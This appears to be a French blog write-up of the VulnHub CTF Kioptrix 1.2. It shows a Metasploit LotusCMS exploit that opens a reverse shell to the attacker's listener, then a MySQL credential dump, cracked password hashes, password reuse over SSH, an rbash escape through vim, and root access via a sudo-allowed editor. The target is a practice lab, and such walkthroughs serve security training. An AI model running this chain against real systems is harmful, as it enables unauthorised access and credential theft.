# Solution du CTF Kioptrix: 1.2 de VulnHub

Voici la solution du [CTF Kioptrix 1.2](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/) qui date d'avril 2011  

CMS en mousse
-------------

```plain
Nmap scan report for 192.168.1.28
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp   open     http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Ligoat Security - Got Goat? Security ...
9874/tcp filtered unknown
```

Sur le serveur Apache se trouve un CMS que [Wappalizer](https://www.wappalyzer.com/) ne reconnaît pas mais si on se rend sur la page de login on peut lire *Proudly Powered by: LotusCMS*  

On trouve facilement un [exploit Metasploit](https://www.exploit-db.com/exploits/18565/) pour ce CMS et comme la *DisclosureDate* est au 3 mars 2011 dans le code de l'exploit ça en fait un très bon candidat...  

Au passage il y a aussi sur le site une galerie PHP dont on trouve facilement le nom (*Gallarific*) grâce à la présence du balise méta. Il existe différents exploits là aussi trouvables sur *exploit-db*.  

Grace au module Metasploit l'exploitation est aisée :  

```plain
msf exploit(lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.1.28     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /                yes       URI
   VHOST    kioptrix3.com    no        HTTP server virtual host

Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.3      yes       The listen address
   LPORT  9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0

msf exploit(lcms_php_exec) > exploit

[*] Started reverse TCP handler on 192.168.1.3:9999 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Command shell session 3 opened (192.168.1.3:9999 -> 192.168.1.28:40897) at 2018-02-14 21:04:35 +0100
id;uname -a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
```

On trouve deux utilisateurs sur le système: *dreg* et *loneferret*.  

Ainsi que les identifiants SQL dans la configuration de la galerie (rien pour le CMS qui est file-based) :  

```php
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

L'historique de l'un des utilisateurs est lisible :  

```plain
www-data@Kioptrix3:/home$ cat loneferret/.bash_history
sudo ht
exit
```

Je décide de faire un tour du côté du MySQL :  

```plain
www-data@Kioptrix3:/etc$ mysql -u root -p
mysql -u root -p
Enter password: fuckeyou

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| gallery            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> use gallery;
use gallery;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         | 
| gallarific_comments  | 
| gallarific_galleries | 
| gallarific_photos    | 
| gallarific_settings  | 
| gallarific_stats     | 
| gallarific_users     | 
+----------------------+
7 rows in set (0.00 sec)

mysql> select * from dev_accounts;
select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
+----+------------+----------------------------------+
2 rows in set (0.00 sec)

mysql> select * from gallarific_users;
select * from gallarific_users;
+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |
+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | 
+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
1 row in set (0.00 sec)
```

Passwords faibles
-----------------

On retrouve facilement les mots de passe des utilisateurs qui sont respectivement *Mast3r* pour *dreg* et *starwars* pour *loneferret*.  

Ca tombe bien, dreg a le même mot de passe pour le système :  

```plain
$ ssh dreg@192.168.1.28
dreg@192.168.1.28's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
dreg@Kioptrix3:~$ sudo -l
[sudo] password for dreg: 
Sorry, user dreg may not run sudo on Kioptrix3.
dreg@Kioptrix3:~$ cd ..
rbash: cd: restricted
```

On est dans un environnement restreint (*rbash*) qui ne nous permet pas de sortir du dossier courant.  

Heureusement on peu en sortir en passant par Vim via les commandes suivantes (définir un shell différent et l'exécuter) :  

```plain
:set shell=/bin/bash
:shell
```

Mais en réalité tout celà ne sert à rien puisque le mot de passe pour *loneferret* est aussi bon :  

```plain
dreg@Kioptrix3:~$ su loneferret         
Password: 
loneferret@Kioptrix3:/home/dreg$ id
uid=1000(loneferret) gid=100(users) groups=100(users)
```

C'est du gâteau
---------------

On sait que l'utilisateur peut lancer [HT Editor](http://devloop.users.sourceforge.net/index.php?article25/tutoriel-d-utilisation-de-ht-editor) en tant que root.  

*HT* est un désassembler mais aussi un éditeur de texte classique. Il suffit donc d'aller ouvrir le dossier /root puis de lire le flag (*Congrats.txt*).  

![Kioptrix3 flag opened with HT Editor](https://raw.githubusercontent.com/devl00p/blog/master/images/kioptrix/kioptrix3_ht.png)

Une erreur *Error opening terminal: xterm-256color* empêchait tout de même d'exécuter *HT*, il fallait y rémédier avec la commande *export TERM=xterm*.  


*Published February 22 2018 at 18:02*